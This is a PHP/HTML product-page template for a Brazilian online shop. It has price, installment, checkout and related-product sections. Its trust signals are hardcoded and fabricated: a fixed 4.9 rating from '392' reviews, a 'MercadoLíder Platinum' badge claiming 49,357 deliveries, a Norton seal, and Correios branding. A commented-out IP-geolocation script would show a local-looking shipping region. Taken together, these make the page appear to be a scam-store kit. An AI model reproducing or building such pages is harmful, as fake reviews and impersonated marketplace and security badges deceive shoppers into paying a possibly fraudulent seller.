<div class="elementor-element elementor-element-542b2ec3 elementor-widget elementor-widget-html" data-id="542b2ec3" data-element_type="widget" data-widget_type="html.default">
<div class="elementor-widget-container">
<div style="margin-top: 4px;font-size:13px;color: #b7b7b7;">
<span class="product-meta__sku-number">(Cód. Item 17621205)</span> 
<span class="quantitysell" style="color: #3A2A2F;"> | </span>
<span class="quantitysell" style="color: #0086ff;">Disponível em estoque.</span>
</div>		</div>
</div>
<div class="elementor-element elementor-element-52db4123 elementor-widget-mobile__width-initial elementor-widget__width-initial elementor--star-style-star_fontawesome elementor-widget elementor-widget-star-rating" data-id="52db4123" data-element_type="widget" data-widget_type="star-rating.default">
<div class="elementor-widget-container">

<div class="elementor-star-rating__wrapper">
<div class="elementor-star-rating" title="5/5" itemtype="http://schema.org/Rating" itemscope="" itemprop="reviewRating"><i class="elementor-star-full">&#xE934;</i><i class="elementor-star-full">&#xE934;</i><i class="elementor-star-full">&#xE934;</i><i class="elementor-star-full">&#xE934;</i><i class="elementor-star-full">&#xE934;</i> <span itemprop="ratingValue" class="elementor-screen-only">5/5</span></div>		</div>
</div>
</div>
<div class="elementor-element elementor-element-1aea454e elementor-widget-mobile__width-initial elementor-widget__width-initial elementor-widget elementor-widget-text-editor" data-id="1aea454e" data-element_type="widget" data-widget_type="text-editor.default">
<div class="elementor-widget-container">
<p>4.9 (392 Avaliações)</p>						</div>
</div>
<div class="elementor-element elementor-element-11997a9e elementor-widget elementor-widget-image" data-id="11997a9e" data-element_type="widget" data-widget_type="image.default">
<div class="elementor-widget-container">
<img decoding="async" width="320" height="32" src="./arquivos/pre-bf-produto_c20bae4f-7115-4a58-9ac7-96d2dd25cba1-1.gif" class="attachment-large size-large" alt="" loading="lazy" />															</div>
</div>
<div class="elementor-element elementor-element-64e5f08f elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="64e5f08f" data-element_type="widget" data-widget_type="divider.default">
<div class="elementor-widget-container">
<div class="elementor-divider">
<span class="elementor-divider-separator">
</span>
</div>
</div>
</div>
<div class="elementor-element elementor-element-5950642 elementor-widget-mobile__width-initial elementor-widget__width-initial elementor-widget elementor-widget-text-editor" data-id="5950642" data-element_type="widget" data-widget_type="text-editor.default">
<div class="elementor-widget-container">
<p>Preço:</p>
</div>
</div>
<div style="width:35% !important; max-width: 39% !important;" class="elementor-element elementor-element-359214f elementor-widget__width-initial elementor-widget elementor-widget-text-editor" data-id="359214f" data-element_type="widget" data-widget_type="text-editor.default">
<div class="elementor-widget-container">
<!--<p><span style="color: #ff5959;"><del>R$129.90</del></span></p>-->
<h2>
<span style="color: #00d864;"><strong id="prince2"></strong></span>
</h2>
</div>
</div>
<div class="elementor-element elementor-element-7ec488c6 elementor-mobile-align-center elementor-widget-mobile__width-initial elementor-align-center elementor-widget__width-initial elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="7ec488c6" data-element_type="widget" data-widget_type="icon-list.default">
<div class="elementor-widget-container">
<ul class="elementor-icon-list-items">
<li class="elementor-icon-list-item">
<span class="elementor-icon-list-icon">
<i aria-hidden="true" class="fas fa-arrow-down"></i>						</span>
<span class="elementor-icon-list-text"><?php echo $desconto;?>%</span>
</li>
</ul>
</div>
</div>
<div class="elementor-element elementor-element-7ad31693 elementor-widget elementor-widget-text-editor" data-id="7ad31693" data-element_type="widget" data-widget_type="text-editor.default">
<div class="elementor-widget-container">
<div class="produto-det-preco-parcelamento">Em até <b>12x</b> de <b>R$ <?php echo number_format($parcela12[0],2,",",".");?></b></div>						</div>
</div>
<div class="elementor-element elementor-element-67a66748 elementor-widget__width-initial elementor-widget elementor-widget-text-editor" data-id="67a66748" data-element_type="widget" data-widget_type="text-editor.default">
<div class="elementor-widget-container">
</div>
</div>
<!--
<div class="elementor-element elementor-element-5d76d947 elementor-mobile-align-center elementor-widget-mobile__width-initial elementor-icon-list--layout-inline elementor-align-center elementor-widget__width-initial elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="5d76d947" data-element_type="widget" data-widget_type="icon-list.default">
<div class="elementor-widget-container">
<ul class="elementor-icon-list-items elementor-inline-items">
<li class="elementor-icon-list-item elementor-inline-item">
<span class="elementor-icon-list-text">R$ 80 de desconto</span>
</li>
</ul>
</div>
</div>-->
<div class="elementor-element elementor-element-1eaa0dca elementor-widget elementor-widget-text-editor" data-id="1eaa0dca" data-element_type="widget" data-widget_type="text-editor.default">
<div class="elementor-widget-container">
<!--		<script>    
$.getJSON( "https://wtfismyip.com/json", function(localizacao) {
var localizacao = localizacao['YourFuckingLocation'];
var regiao = localizacao.replace(", Brazil", "");
$("#custom-address").html("Envio para <b>" + regiao + " e Região</b>");
});
</script>	-->

</div>
</div>


<div style="text-align:center;" class="elementor-element elementor-element-527b803b elementor-align-center elementor-widget elementor-widget-button" data-id="527b803b" data-element_type="widget" data-widget_type="button.default">
<div class="elementor-widget-container">
<div class="elementor-button-wrapper">
<a style="box-shadow: 0px 0px 10px 0px #000000 !important; background-color: <?php echo $cor;?> !important;" href="checkout.php?checkId=<?php echo md5(rand(999999999,999999999));?>&marketingId=<?php echo time();?>&produto=<?php echo $codigo;?>" class="elementor-button-link elementor-button elementor-size-lg" role="button">
<span class="elementor-button-content-wrapper">
<span class="elementor-button-icon elementor-align-icon-left">
<i aria-hidden="true" class="fas fa-shopping-basket"></i>			</span>
<span class="elementor-button-text">COMPRAR AGORA</span>
</span>
</a>
</div>
</div>
</div>


<div class="elementor-element elementor-element-15f8da3b elementor-widget elementor-widget-html" data-id="15f8da3b" data-element_type="widget" data-widget_type="html.default">
<div class="elementor-widget-container">
<div class="fretefundo" style="border-color: #0062AC">

<!--CORREIOS-->

<img decoding="async" style="margin: -10px 5px -10px -8px" src="./arquivos/correios-logo_1.svg?v=<?php echo time();?>">
<p class="ttl-frete">Entrega via Correios©
<span class="ip-frete" id="custom-address">Envio EXPRESSO para todo Brasil</b></span></p>
<p class="txt-frete"><b>Frete Grátis</b></p>

<!--CORREIOS-->

<style>

@media (max-width: 640px) {
.fretefundo > img {
height: 52px;
}
.fretefundo > p > span {
font-size: 10px;
}
.fretefundo {
margin-top: 0;
}
.txt-frete {
font-size: 10px;
color: #00bd58;
font-weight: bold;
padding: 0;
margin: 0;
margin-right: -5px!important;
}
}

.fretefundo {
display: flex;
flex-direction: row;
justify-content: space-between;
align-items: center;
}

.ttl-frete {
flex-grow: 1;
font-size: 14px;
line-height: 1.6;
margin-bottom: 0;
color: var(--text-color);
}

@media (min-width: 641px){
.txt-frete {
font-size: 12px;
color: #00bd58;
font-weight: bold;
padding: 0;
margin: 0;
}}

.ip-frete {
display: block;
font-size: 12px;
font-weight: 600;
color: #00bd58;
}

</style>

</div>


</div>
</div>
<div class="elementor-element elementor-element-1a1aaa38 elementor-widget elementor-widget-html" data-id="1a1aaa38" data-element_type="widget" data-widget_type="html.default">
<div class="elementor-widget-container">
<style>

.mp_platinum {

min-width: 325px;
max-width: 100%;
margin: 0 auto;
padding: 10px;
border: 0px solid #0000001a;
border-radius: 10px;
box-shadow: 0px 8px 4px -4px /*#e5e5e5*/ #fff;
margin-top: 20px;

}

.mp_platinum li {
list-style: none;
}

.mp_platinum p {
margin: 5px;
}

.ui-box-component-pdp__visible--desktop {
width: 100%;
border-radius: 8px;
border: 1px solid rgba(0,0,0,.1);
margin: 24px 0;
padding: 32px 16px 24px;
}

.ui-seller-info__status-info {
display: -webkit-flex;
display: flex;
margin-bottom: 20px;
}

.ui-seller-info__status-info__icon {
margin: 2px 10px 0 0;
width: 20px;
text-align: center;
}

.ui-pdp-color--GREEN.ui-pdp-icon {
fill: #00a650;
}

.ui-pdp-seller__status-title {

font-size: 16px;
font-weight: 600;
color: #00a650;
padding: 0;
margin: 2px 0 -12px 0 !important;

}

.ui-seller-info__status-info__subtitle {

font-size: 14px;
color: rgba(0,0,0,.55);
margin: 5px 0 0 0 !important;

}

.ui-thermometer {

width: 100%;
height: auto;
margin: 0;
padding: 0;
-webkit-appearance: none;
-moz-appearance: none;
appearance: none;
overflow: hidden;
display: block;
-moz-box-sizing: border-box;
box-sizing: border-box;
vertical-align: baseline;

}

.ui-thermometer__level {
width: 20%;
height: 8px;
margin-top: 2px;
-moz-box-sizing: border-box;
box-sizing: border-box;
float: left;
border-left: 6px solid #fff;
}

.ui-thermometer__level--1 {
background: #fff0f0;
}

.ui-thermometer__level--2 {
background: #fff5e8;
}

.ui-thermometer__level--3 {
background: #fffcda;
}

.ui-thermometer__level--4 {
background: #f1fdd7;
}

.ui-thermometer[value="5"] .ui-thermometer__level--5 {
height: 12px;
margin: 0;
background: #39b54a;
}

.ui-pdp-seller__reputation-info {
margin-top: 16px;
}

.ui-pdp-seller__list-description {

display: -webkit-flex;
display: flex;
justify-content: center;
margin: 0;
padding: 0;

}

.ui-pdp-seller__item-description {

display: -webkit-flex;
display: flex;
-webkit-flex-direction: column;
flex-direction: column;
-webkit-align-items: center;
align-items: center;
text-align: center;
font-size: 12px;
position: relative;
line-height: 1;
padding: 8px 5px;

}

.ui-pdp-seller__sales-description {
font-size: 24px;
color: #000;
line-height: 1.2;
font-weight: 400;
display: block;
}

.ui-pdp-seller__text-description {
margin-top: 8px;
line-height: 1;
}

.ui-pdp-seller__item-description:after {
background: #ddd;
content: "";
height: 91%;
position: absolute;
right: 0;
top: 8%;
width: 1px;
}

.ui-pdp-seller__item-description:last-of-type:after {
display: none;
}

.ui-pdp-seller__icon-description {
display: inline-block;
width: 28px;
padding-top: 3px;
vertical-align: top;
}

.ui-pdp-icon, .ui-pdp-icon--shipping {
fill: rgba(0,0,0,.25);
}



</style><div style="padding: 12px 20px 1px 20px; border-radius: 12px 12px 0 0; background: #f5f5f5; margin-top: 10px; display: flex;">

<div style="margin-right: 18px">

<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 488.636 488.636" width="45" height="45" style="widht: 13%;" xml:space="preserve"><g><g>

<path fill="#00bd58" d="M384.936,125.936c7.1,0,9.1-9.6,2.7-12.5l-249.9-110.8c-15.2-6.8-33.1,0-39.9,15.3l-87.5,196.2 c-6.8,15.2,0,33.1,15.3,39.9l50.4,21.8c6.3,2.8,13.5-1.8,13.5-8.7v-83.3c0-31.9,25.9-57.8,57.8-57.8h237.6V125.936z"></path>
<path fill="#404040" d="M450.336,153.136h-303.1c-16.9,0-30.6,13.7-30.6,30.6v214.1c0,16.9,13.7,30.6,30.6,30.6h40.7c-1-6-1.5-12.1-1.5-18.3 c0-7,0.7-13.8,1.9-20.5h-32.8v-102.5h286.6v102.4h-32.9c1.2,6.7,1.9,13.5,1.9,20.5c0,6.2-0.5,12.3-1.5,18.3h40.7 c16.9,0,30.6-13.7,30.6-30.6v-214C480.936,166.836,467.236,153.136,450.336,153.136z M442.136,224.036h-286.6v-32.1h286.6V224.036 z"></path>
<path fill="#00bd58" d="M298.836,331.436c-43.4,0-78.6,35.2-78.6,78.6s35.2,78.6,78.6,78.6s78.6-35.2,78.6-78.6S342.236,331.436,298.836,331.436z M321.436,441.036c-3.4,4.2-7.9,7-13.1,8.4c-2.3,0.6-3.3,1.8-3.2,4.2c0.1,2.3,0,4.6,0,7c0,2.1-1.1,3.2-3.1,3.2 c-2.5,0.1-5,0.1-7.5,0c-2.2,0-3.2-1.3-3.2-3.4c0-1.7,0-3.4,0-5.1c0-3.7-0.2-3.9-3.8-4.5c-4.6-0.7-9.1-1.8-13.3-3.8 c-3.3-1.6-3.7-2.4-2.7-5.9c0.7-2.6,1.4-5.2,2.2-7.7c0.9-3,1.7-3.3,4.5-1.9c4.7,2.4,9.6,3.8,14.8,4.4c3.3,0.4,6.6,0.1,9.7-1.3 c5.8-2.5,6.7-9.2,1.8-13.2c-1.7-1.4-3.5-2.4-5.5-3.2c-5.1-2.2-10.4-3.9-15.1-6.8c-7.8-4.6-12.7-11-12.1-20.5 c0.6-10.7,6.7-17.3,16.5-20.9c4-1.5,4.1-1.4,4.1-5.6c0-1.4,0-2.9,0-4.3c0.1-3.2,0.6-3.7,3.8-3.8c1,0,2,0,2.9,0 c6.8,0,6.8,0,6.8,6.8c0,4.8,0,4.8,4.8,5.5c3.6,0.6,7.1,1.6,10.5,3.1c1.9,0.8,2.6,2.1,2,4.1c-0.8,2.9-1.6,5.9-2.6,8.7 c-0.9,2.7-1.8,3.1-4.4,1.9c-5.3-2.6-10.8-3.6-16.6-3.3c-1.5,0.1-3,0.3-4.4,0.9c-5,2.2-5.9,7.8-1.6,11.2c2.2,1.7,4.6,3,7.2,4.1 c4.5,1.8,8.9,3.6,13.2,6C327.236,412.636,330.936,429.536,321.436,441.036z"></path></g></g><g></g><g></g><g></g><g></g><g></g><g></g>

</svg>
</div>  

<p style="line-height: 20px; font-size: 14px;">Parcele suas compras<br><b style="color: #00bd58">nas melhores bandeiras</b></p>

</div>		</div>
</div>
<div class="elementor-element elementor-element-21e5b08b elementor-widget elementor-widget-image" data-id="21e5b08b" data-element_type="widget" data-widget_type="image.default">
<div class="elementor-widget-container">
<img decoding="async" width="590" height="86" src="./arquivos/bandeiras-1.png" class="attachment-large size-large" alt=""  />															</div>
</div>
<div class="elementor-element elementor-element-20b5a76e elementor-widget elementor-widget-html" data-id="20b5a76e" data-element_type="widget" data-widget_type="html.default">
<div class="elementor-widget-container">
<div class="mp_platinum">

<div class="ui-seller-info">

<div class="ui-seller-info__status-info">


<img decoding="async" src="./arquivos/aaa3939.png?v=<?php echo time();?>">


<div style="margin: 9px 0 0px 11px;">
<p class="ui-seller-info__status-info__title ui-pdp-seller__status-title">MercadoLíder Platinum</p>
<p class="ui-seller-info__status-info__subtitle">Um dos melhores sites!</p>
</div>
</div>
<ul aria-hidden="true" class="ui-thermometer" value="5">
<li class="ui-thermometer__level ui-thermometer__level--1"></li>
<li class="ui-thermometer__level ui-thermometer__level--2"></li>
<li class="ui-thermometer__level ui-thermometer__level--3"></li>
<li class="ui-thermometer__level ui-thermometer__level--4"></li>
<li class="ui-thermometer__level ui-thermometer__level--5"></li>
</ul>
<div class="ui-pdp-seller__reputation-info">
<ul class="ui-pdp-seller__list-description">
<li class="ui-pdp-seller__item-description">

<strong class="ui-pdp-seller__sales-description">49357</strong>

<p class="ui-pdp-seller__text-description">Pedidos entregues nos últimos 60 dias</p>
</li>
<li class="ui-pdp-seller__item-description">
<strong aria-hidden="true" class="ui-pdp-seller__icon-description">
<svg class="ui-pdp-icon ui-pdp-icon--message-positive ui-pdp-color--REP_SELLER_ATTENTION_GOOD" viewBox="0 0 29 24" xmlns="http://www.w3.org/2000/svg">
<g fill-rule="evenodd" fill="none">
<path d="M6.747 21.511l4.538-3.518h8.238c1.032 0 1.868-.98 1.868-2.19V3.21c0-1.21-.836-2.19-1.868-2.19H3.173c-1.032 0-1.869.98-1.869 2.19v14.077c0 .39.316.706.706.706H5.61v2.96a.706.706 0 0 0 1.138.558z" stroke-width="1.5" stroke="#333"></path>
<g transform="translate(14 9)">
<circle cx="7.5" cy="7.5" r="7.5" fill="#39B54A"></circle>
<g stroke-linecap="round" stroke-width="1.059" stroke="#FFF"><path d="M3.75 7.5l2.445 2.445M6.25 9.89L11.14 5"></path></g>
</g>
</g>
</svg>
</strong>
<p class="ui-pdp-seller__text-description">Presta bom atendimento</p>
</li>
<li class="ui-pdp-seller__item-description">
<strong aria-hidden="true" class="ui-pdp-seller__icon-description">
<svg class="ui-pdp-icon ui-pdp-icon--time-positive ui-pdp-color--REP_SELLER_DELIVERY_TIME_GOOD" viewBox="0 0 30 26" xmlns="http://www.w3.org/2000/svg">
<g fill-rule="evenodd" fill="none">
<g transform="translate(1 .02)" stroke="#333">
<ellipse cx="10.5" cy="13.714" rx="10.5" ry="10.286" stroke-width="1.286"></ellipse>
<path d="M19.107 13.714h-1.59M3.42 13.714H1.83M10.5 5.143v1.59M10.563 20.571v1.59M10.5.857v2.484M8.75.857h3.637M10.313 8.801v4.944H5.24" stroke-linecap="round" stroke-width="1.102"></path>
</g>
<g transform="translate(15 10.02)">
<circle cx="7.5" cy="7.5" r="7.5" fill="#39B54A"></circle>
<g stroke-linecap="round" stroke-width="1.059" stroke="#FFF"><path d="M3.75 7.5l2.445 2.445M6.25 9.89L11.14 5"></path></g>
</g>
</g>
</svg>
</strong>
<p class="ui-pdp-seller__text-description">Entrega os produtos dentro do prazo</p>
</li>
</ul>
</div>
</div>

</div>		</div>
</div>
</div>
</div>
</div>
</section>
</div>
</div>
</div>
</section>
<section class="elementor-section elementor-top-section elementor-element elementor-element-3748ecc0 elementor-hidden-desktop elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="3748ecc0" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-7e5808e3" data-id="7e5808e3" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-19cfc5fc moozen elementor-widget elementor-widget-heading" data-id="19cfc5fc" data-element_type="widget" data-widget_type="heading.default">
<div class="elementor-widget-container">
<h2 class="elementor-heading-title elementor-size-default">Descrição</h2>		</div>
</div>
<div class="elementor-element elementor-element-61b57a06 elementor-widget elementor-widget-image" data-id="61b57a06" data-element_type="widget" data-widget_type="image.default">






<div class="elementor-widget-container">
<?php 
$z1 = "arquivos/produtos/".$codigo."/descricao/"; 
$z2 = glob($z1 . "*.png");

foreach($z2 as $z3){

echo '<img decoding="async" width="300" height="262" src="'.$z3.'?skin2='. rand(999999999,999999999) .'" class="attachment-large size-large" alt="" loading="lazy" />';

}
?>
</div>





</div>
<div class="elementor-element elementor-element-2933b84b elementor-widget elementor-widget-text-editor" data-id="2933b84b" data-element_type="widget" data-widget_type="text-editor.default">



<!-- DESCRÇÃO-->

<div class="elementor-widget-container">
<p><?php echo $descricao; ?></p>
</div>



</div>
<div class="elementor-element elementor-element-5ac5a8e0 elementor-widget elementor-widget-heading" data-id="5ac5a8e0" data-element_type="widget" data-widget_type="heading.default">
<div style="margin-top:20px; margin-bottom:20px;" class="elementor-widget-container">
<h2 style="color:<?php echo $cor;?> !important;"class="elementor-heading-title elementor-size-default">Você também pode gostar</h2>
</div>
</div>











<!--LISTA PRODUTOS-->
<?php 

$sql1 = mysqli_query($conn, "SELECT * from produto");
while($row1 = mysqli_fetch_array($sql1)){ 
$codigo2 = $row1["codigo"];
$nomeproduto = $row1["nome"];
$valor = $row1["valor"];
$img2 = $row1["img"];

if($codigo2==$codigo){
}else{

?>
<div style="max-width: 100%; width: 100%; margin-bottom: 20px; margin-top:20px; text-align:center;">
<div class="elementor-element elementor-element-7cac5bff elementor-widget elementor-widget-image" data-id="7cac5bff" data-element_type="widget" data-widget_type="image.default">
<div class="elementor-widget-container">
<img style="width: 220px !important;" width="500" height="324" src="./arquivos/produtos/<?php echo $codigo2;?>/<?php echo $img2;?>?Tfake=<?php echo time();?>" class="attachment-large size-large" alt="" loading="lazy"  />															</div>
</div>

<h3 style="margin-top:15px; color:#787878 !important; font-size:17px !important;" class="elementor-heading-title elementor-size-default"><?php echo $nomeproduto;?></h3>
<h3 style="margin-top:15px; color:#787878 !important; font-size:17px !important;" class="elementor-heading-title elementor-size-default">R$ <?php echo $valor;?></h3>

<div style="margin-top:15px; text-align: center;" class="elementor-element elementor-element-441abf2a elementor-align-center elementor-mobile-align-right elementor-widget elementor-widget-button" data-id="441abf2a" data-element_type="widget" data-settings="{&quot;_animation_mobile&quot;:&quot;bounceIn&quot;}" data-widget_type="button.default">
<div class="elementor-widget-container">
<div class="elementor-button-wrapper">



<a style="font-size: 13px !important; padding: 12px 16px !important; border-radius: 0px !important;font-weight: bold !important; font-family: arial !important; box-shadow: 0px 0px 10px 0px #000000 !important; background-color: <?php echo $cor;?> !important;" href="index.php?id=<?php echo $codigo2;?>" class="elementor-button-link elementor-button elementor-size-lg" role="button">
<span class="elementor-button-content-wrapper">
<span class="elementor-button-icon elementor-align-icon-left">
<i aria-hidden="true" class="fas fa-shopping-basket"></i></span>
<span class="elementor-button-text">COMPRAR AGORA</span>
</span>
</a>
</div>
</div>
</div>
</div>
<?php 
}
}
?>












</div>
</div>
</div>
</section>
<section class="elementor-section elementor-top-section elementor-element elementor-element-3d8d228e elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="3d8d228e" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-4dea4034" data-id="4dea4034" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-6c48c33e elementor-position-left elementor-widget__width-initial elementor-hidden-tablet elementor-hidden-mobile elementor-view-default elementor-mobile-position-top elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="6c48c33e" data-element_type="widget" data-widget_type="icon-box.default">
<div class="elementor-widget-container">

<div class="elementor-icon-box-wrapper">
<div class="elementor-icon-box-icon">
<span class="elementor-icon elementor-animation-" >
<i aria-hidden="true" class="fas fa-shield-alt"></i>				</span>
</div>
<div class="elementor-icon-box-content">
<h3 class="elementor-icon-box-title">
<span  >
Compra Segura					</span>
</h3>
<p class="elementor-icon-box-description">
Ambiente seguro para<br>pagamentos online					</p>
</div>
</div>
</div>
</div>
<div class="elementor-element elementor-element-76db7dbb elementor-position-left elementor-widget__width-initial elementor-hidden-tablet elementor-hidden-mobile elementor-view-default elementor-mobile-position-top elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="76db7dbb" data-element_type="widget" data-widget_type="icon-box.default">
<div class="elementor-widget-container">
<div class="elementor-icon-box-wrapper">
<div class="elementor-icon-box-icon">
<span class="elementor-icon elementor-animation-" >
<i aria-hidden="true" class="fas fa-shipping-fast"></i>				</span>
</div>
<div class="elementor-icon-box-content">
<h3 class="elementor-icon-box-title">
<span  >
Entrega Grátis					</span>
</h3>
<p class="elementor-icon-box-description">
Envio rápido e acompanhado<br>com código de rastreio					</p>
</div>
</div>
</div>
</div>
<div class="elementor-element elementor-element-17033301 elementor-position-left elementor-widget__width-initial elementor-hidden-tablet elementor-hidden-mobile elementor-view-default elementor-mobile-position-top elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="17033301" data-element_type="widget" data-widget_type="icon-box.default">
<div class="elementor-widget-container">
<div class="elementor-icon-box-wrapper">
<div class="elementor-icon-box-icon">
<span class="elementor-icon elementor-animation-" >
<i aria-hidden="true" class="fas fa-headset"></i>				</span>
</div>
<div class="elementor-icon-box-content">
<h3 class="elementor-icon-box-title">
<span  >
Suporte Profissional					</span>
</h3>
<p class="elementor-icon-box-description">
Equipe de suporte de extrema<br>qualidade a semana toda					</p>
</div>
</div>
</div>
</div>
<div class="elementor-element elementor-element-76c4ce74 elementor-position-left elementor-widget__width-initial elementor-hidden-tablet elementor-hidden-mobile elementor-view-default elementor-mobile-position-top elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="76c4ce74" data-element_type="widget" data-widget_type="icon-box.default">
<div class="elementor-widget-container">
<div class="elementor-icon-box-wrapper">
<div class="elementor-icon-box-icon">
<span class="elementor-icon elementor-animation-" >
<i aria-hidden="true" class="fas fa-american-sign-language-interpreting"></i>				</span>
</div>
<div class="elementor-icon-box-content">
<h3 class="elementor-icon-box-title">
<span  >
Satisfação ou Reembolso					</span>
</h3>
<p class="elementor-icon-box-description">
Caso haja algo, devolvemos seu<br>dinheiro com velocidade					</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section class="elementor-section elementor-top-section elementor-element elementor-element-2e2ad66b elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="2e2ad66b" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-5c074854" data-id="5c074854" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-10743f98 elementor-widget elementor-widget-html" data-id="10743f98" data-element_type="widget" data-widget_type="html.default">
<div class="elementor-widget-container">
<div class="container-fluid color-line" style="background: linear-gradient(to right, #000, <?php echo $cor;?>, #000, <?php echo $cor;?>); height: 6px; width: 100%;">
</div></div>
</div>
</div>
</div>
</div>
</section>
<section class="elementor-section elementor-top-section elementor-element elementor-element-7af19428 elementor-hidden-tablet elementor-hidden-mobile elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="7af19428" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-5ee522ab" data-id="5ee522ab" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<section class="elementor-section elementor-inner-section elementor-element elementor-element-1e7fc3a4 elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="1e7fc3a4" data-element_type="section">
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-2994615f" data-id="2994615f" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-22b98c5e elementor-widget elementor-widget-image" data-id="22b98c5e" data-element_type="widget" data-widget_type="image.default">


<div class="elementor-widget-container">

<?php 
$f = "arquivos/logo/"; 
$i = glob($f . "*.png");

foreach($i as $im){
echo '
<img decoding="async" width="636" height="324" src="'.$im.'?Tfake=<?php echo time();?>" class="attachment-large size-large" alt="" loading="lazy"  />															</div>

';
}
?>


</div>


<div class="elementor-element elementor-element-6664a2a7 elementor-widget elementor-widget-text-editor" data-id="6664a2a7" data-element_type="widget" data-widget_type="text-editor.default">





<div class="elementor-widget-container">
<p><strong>ATENDIMENTO AO CLIENTE</strong></p>
<p><strong>SAC ( Serviço de Atendimento ao Consumidor )</strong></p>
<!--<p><strong>E-mail:</strong> sac@choppexpress.com</p>-->
<p><strong>E-mail:</strong> sac@choppexpress.com</p>
</div>



</div>
</div>
</div>
<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-1b465e0a" data-id="1b465e0a" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-5fa131de elementor-widget elementor-widget-text-editor" data-id="5fa131de" data-element_type="widget" data-widget_type="text-editor.default">
<div class="elementor-widget-container">
<p><b>TERMOS E CONDIÇÕES</b></p>						</div>
</div>
<div class="elementor-element elementor-element-486bd766 elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="486bd766" data-element_type="widget" data-widget_type="icon-list.default">
<div class="elementor-widget-container">
<ul class="elementor-icon-list-items">
<li class="elementor-icon-list-item">
<span class="elementor-icon-list-text">Politica de privacidade</span>
</li>
<li class="elementor-icon-list-item">
<span class="elementor-icon-list-text">Politica de reembolso</span>
</li>
<li class="elementor-icon-list-item">
<span class="elementor-icon-list-text">Politica de envio</span>
</li>
<li class="elementor-icon-list-item">
<span class="elementor-icon-list-text">Termos e condições</span>
</li>
</ul>
</div>
</div>
</div>
</div>
<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-50517de8" data-id="50517de8" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-21ddad29 elementor-widget elementor-widget-text-editor" data-id="21ddad29" data-element_type="widget" data-widget_type="text-editor.default">
<div class="elementor-widget-container">
<p><strong>NOSSA NEWSLATTER</strong></p><p>Assine nossa newsletter e receba as melhores ofertas DE GRAÇA!</p>						</div>
</div>
</div>
</div>
</div>
</section>
<div class="elementor-element elementor-element-7014b144 elementor-widget elementor-widget-text-editor" data-id="7014b144" data-element_type="widget" data-widget_type="text-editor.default">
<div class="elementor-widget-container">
Preços e condições de pagamento exclusivos para compras neste site oficial, podendo variar com o tempo da oferta. Evite comprar produtos mais baratos ou de outras lojas, pois você pode estar sendo enganado(a) por um golpista. Caso você compre os mesmos produtos em outras lojas,<strong> não nos responsabilizamos por quaisquer problemas.</strong>						</div>
</div>
<section class="elementor-section elementor-inner-section elementor-element elementor-element-34429fc2 elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="34429fc2" data-element_type="section">
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-1678aa8a" data-id="1678aa8a" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-45ddf4b4 elementor-widget__width-initial elementor-widget elementor-widget-text-editor" data-id="45ddf4b4" data-element_type="widget" data-widget_type="text-editor.default">
<div class="elementor-widget-container">
<p>Loja <?php echo $nome;?> © CNPJ 38.373.657/0001-77 | R. Armando Salles de Oliveira, 53 -Taubaté &#8211; SP, 12030-080 | Todos direitos reservados.</p>						</div>
</div>
</div>
</div>
<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-52d4ce9b" data-id="52d4ce9b" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-4d4da868 elementor-widget-mobile__width-initial elementor-widget__width-initial elementor-widget elementor-widget-image" data-id="4d4da868" data-element_type="widget" data-widget_type="image.default">
<div class="elementor-widget-container">
<img decoding="async" width="500" height="216" src="./arquivos/NORTON.webp?Tfake=<?php echo time();?>" class="attachment-full size-full" alt="" />															</div>
</div>
<div class="elementor-element elementor-element-40ea7fd7 elementor-widget-mobile__width-initial elementor-widget__width-initial elementor-widget elementor-widget-image" data-id="40ea7fd7" data-element_type="widget" data-widget_type="image.default">
<div class="elementor-widget-container">
